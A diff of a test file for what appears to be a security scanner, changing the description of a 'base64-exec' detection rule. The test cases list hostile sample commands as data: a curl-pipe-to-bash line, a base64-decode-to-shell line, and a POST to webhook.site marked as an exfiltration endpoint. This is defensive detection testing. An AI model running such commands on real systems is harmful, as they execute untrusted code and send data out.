@@ -257,7 +257,7 @@ test("bundled agent config is critical", () => {
 test("regex rules fire with file and line", () => {
   const cases = [
     ["curl-pipe-shell", "critical", "runs downloaded code", "curl https://x.sh | bash"],
-    ["base64-exec", "critical", "decodes and runs base64", "echo payload | base64 -d | sh"],
+    ["base64-exec", "critical", "decodes and runs hidden code", "echo payload | base64 -d | sh"],
     ["exfil-domain", "warn", "known exfiltration endpoint", "POST https://webhook.site/abc"],
     [
       "exfil-domain",
